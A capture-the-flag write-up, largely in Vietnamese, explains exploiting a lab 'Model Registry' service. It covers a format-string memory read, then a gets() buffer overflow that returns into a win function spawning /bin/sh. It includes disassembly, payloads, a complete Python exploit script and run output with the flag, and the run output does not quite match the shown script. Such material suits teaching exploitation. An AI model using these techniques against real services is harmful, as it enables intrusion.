# Writeup: PWN CHALLENGE 3 (Model Registry — Buffer Overflow & Ret2win)

> **Event:** DDC CTF  
> **Category:** PWN  
> **Difficulty:** Easy  
> **Points:** 94  
> **Description:** *"The Model Registry Is Very Accommodating About How Long a Model Name Can Be."*  
> **Host / Port:** `nc 172.31.102.101 10003`  
> **Flag:** `flag{c42af0f9-527f-4581-81a9-b993437e23a7}`

---

## 1. Tóm tắt (TL;DR)

1. Dịch vụ **VinAI Model Registry v1.0** lắng nghe trên cổng `10003`.
2. Khi kết nối, chương trình in banner và rò rỉ con trỏ stack (`Stack frame: 0x7fff...`).
3. Giai đoạn 1 yêu cầu nhập một "diagnostic string" và in ra qua `printf(buf)` → Lỗ hổng **Format String**, cho phép đọc tuỳ ý bộ nhớ.
4. Giai đoạn 2 yêu cầu nhập tên model ("Enter model name: ") và đọc bằng hàm không an toàn `gets(buf)` vào bộ đệm kích thước 64 bytes (`rbp - 0x40`) → Lỗ hổng **Buffer Overflow (Stack Smashing)** không có Stack Canary, PIE tắt (Base `0x400000`).
5. Trong binary có sẵn hàm backdoor / win tại địa chỉ `0x4012b6` thực thi `system("/bin/sh")`.
6. Ghi đè 64 bytes đệm + 8 bytes saved RBP + 1 gadget `ret` (`0x401204` để căn chỉnh 16-byte stack alignment trên x86_64) + địa chỉ `win` (`0x4012b6`).
7. Nhận được interactive root shell trên server, đọc file chứa flag: `flag{c42af0f9-527f-4581-81a9-b993437e23a7}`.

---

## 2. Phân tích chi tiết

### Bước 1: Khảo sát dịch vụ

Kết nối tới server qua lệnh:
```bash
$ nc 172.31.102.101 10003
=================================
 VinAI Model Registry v1.0
=================================
Loaded 3 models. Stack frame: 0x7ffd2de5f758

Model validator ready. Debug mode: ON
Enter diagnostic string: test
Diagnostic output: test

Enter model name: my_model
Loading model: my_model
Model registered successfully.
```

Từ mô tả đề bài:
> *"The Model Registry Is Very Accommodating About How Long a Model Name Can Be."*

Gợi ý trực tiếp tới việc nhập tên model không bị giới hạn độ dài (Buffer Overflow kinh điển qua hàm `gets()`).

---

### Bước 2: Khai thác Format String để phân tích bộ nhớ

Khi gửi các ký tự định dạng (format specifiers) vào `diagnostic string`:
```
Enter diagnostic string: %p.%p.%p.%p.%p.%p
Diagnostic output: 0x7ffe87537040.(nil).0x72cb636d98c7.0x13.(nil).0x70252e70252e7025...
```
Chương trình in ra các giá trị trên thanh ghi và stack thay vì in chuỗi thô, chứng tỏ câu lệnh nội bộ là:
```c
printf(diagnostic_buf); // thay vì printf("%s", diagnostic_buf);
```

Kiểm tra các giá trị code pointer trên stack:
- Địa chỉ trả về nằm ở vùng `0x401xxx` (ví dụ `0x401525`, `0x4013f8`).
- Điều này xác nhận binary **không bật PIE (Position Independent Executable)** và được load cố định tại địa chỉ gốc `0x400000`.
- Dùng kỹ thuật đọc bộ nhớ tuỳ ý với `%8$s`:
  ```python
  payload = b'%8$sAAAA' + b'MARKBBBB' + struct.pack('<Q', target_addr) + b'\n'
  ```
  Ta có thể dump toàn bộ các chuỗi trong `.rodata` và mã máy của `.text`.

---

### Bước 3: Đảo ngược mã máy (Disassembly & Reversing)

Dùng mã máy dump được qua capstone:

#### Hàm xử lý chính (`0x401304`):
```assembly
0x401304: push   rbp
0x401305: mov    rbp, rsp
0x40130c: sub    rsp, 0x140             ; Cấp phát không gian stack
...
0x401358: mov    rdi, rax               ; rbp - 0x140 (buffer diagnostic 256 bytes)
0x40135b: call   fgets                  ; Đọc diagnostic an toàn bằng fgets
...
0x401374: lea    rax, [rbp - 0x140]
0x40137b: mov    rdi, rax
0x401383: call   printf                 ; printf(buf) -> FORMAT STRING
...
0x4013ba: lea    rax, [rbp - 0x40]      ; buffer model_name kích thước 0x40 (64 bytes)
0x4013be: mov    rdi, rax
0x4013c6: call   gets                   ; gets(buf) -> UNBOUNDED BUFFER OVERFLOW!
...
0x4013f6: leave  
0x4013f7: ret    
```

#### Hàm Win / Backdoor (`0x4012b6`):
```assembly
0x4012b6: push   rbp
0x4012b7: mov    rbp, rsp
0x4012be: lea    rax, [rip + 0xd43]     ; "Access granted to secure vault."
0x4012c5: mov    rdi, rax
0x4012c8: call   puts
0x4012cd: lea    rax, [rip + 0xd54]     ; "Use system commands to retrieve your prize."
0x4012d4: mov    rdi, rax
0x4012d7: call   puts
0x4012dc: mov    rax, [stdout]
0x4012e3: mov    rdi, rax
0x4012e6: call   fflush
0x4012eb: lea    rax, [rip + 0xd62]     ; "/bin/sh" (tại địa chỉ 0x402054)
0x4012f2: mov    rdi, rax
0x4012f5: call   system                 ; system("/bin/sh")
0x4012fa: mov    edi, 0
0x4012ff: call   exit
```

---

### Bước 4: Xây dựng Payload Ret2win & Stack Alignment

1. **Stack Layout tại `gets(rbp - 0x40)`:**
   - Offset từ buffer tới `saved RBP`: `64 bytes` (`0x40`).
   - `saved RBP`: `8 bytes`.
   - `saved RIP` (Return Address): bắt đầu ở byte thứ `72`.

2. **Vấn đề Stack Alignment (16-byte boundary trên x86_64):**
   - Trong ABI x86_64, các hàm trong libc (đặc biệt là lệnh `movaps` trong `system` / `do_system`) yêu cầu stack `RSP` phải chia hết cho 16 (`RSP % 16 == 0`).
   - Nếu nhảy thẳng vào `0x4012b6`, `RSP` sẽ bị lệch 8 bytes dẫn đến Segmentation Fault ngay khi spawn shell.
   - Giải pháp: Chèn thêm một lệnh `ret` gadget (`0x401204`) ngay trước địa chỉ hàm win để căn chỉnh stack.

3. **Cấu trúc Payload:**
   ```
   [ 64 bytes 'A' ] + [ 8 bytes 'B' (RBP) ] + [ 8 bytes ret gadget (0x401204) ] + [ 8 bytes win (0x4012b6) ] + '\n'
   ```

---

## 3. Mã khai thác (`solve_pwn3.py`)

```python
#!/usr/bin/env python3
import socket
import struct
import time
import re

def solve(host='172.31.102.101', port=10003):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, int(port)))

    # Đọc banner
    s.recv(1024)

    # Gửi diagnostic string (bất kỳ)
    s.sendall(b'diag\n')
    time.sleep(0.2)
    s.recv(1024)

    # Khởi tạo payload Ret2win
    win_addr = 0x4012b6
    ret_gadget = 0x401204

    payload = b'A' * 64 + b'B' * 8 + struct.pack('<Q', ret_gadget) + struct.pack('<Q', win_addr) + b'\n'
    s.sendall(payload)

    time.sleep(0.5)
    resp = s.recv(4096).decode(errors='ignore')
    print("[*] Server output:\n" + resp.strip())

    # Gửi lệnh shell lấy flag
    s.sendall(b'cat flag* /flag* 2>/dev/null\n')
    time.sleep(1)
    shell_output = s.recv(4096).decode(errors='ignore')
    s.close()

    match = re.search(r'flag\{[^}]+\}', shell_output)
    if match:
        print(f"\n[+] FLAG: {match.group(0)}")
        return match.group(0)

if __name__ == '__main__':
    solve()
```

---

## 4. Kết quả & Flag

Chạy solver:
```bash
$ python solvers/solve_pwn3.py
[*] Banner:
=================================
 VinAI Model Registry v1.0
=================================
Loaded 3 models. Stack frame: 0x7fff9a81c7b8

Model validator ready. Debug mode: ON
Enter diagnostic string:
[*] Sending payload (89 bytes)...
[*] Response:
Loading model: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB  @
Access granted to secure vault.
Use system commands to retrieve your prize.
[*] Fetching flag from shell...
[*] Shell output:
flag{c42af0f9-527f-4581-81a9-b993437e23a7}

[+] Flag found: flag{c42af0f9-527f-4581-81a9-b993437e23a7}
```

Flag:
```
flag{c42af0f9-527f-4581-81a9-b993437e23a7}
```
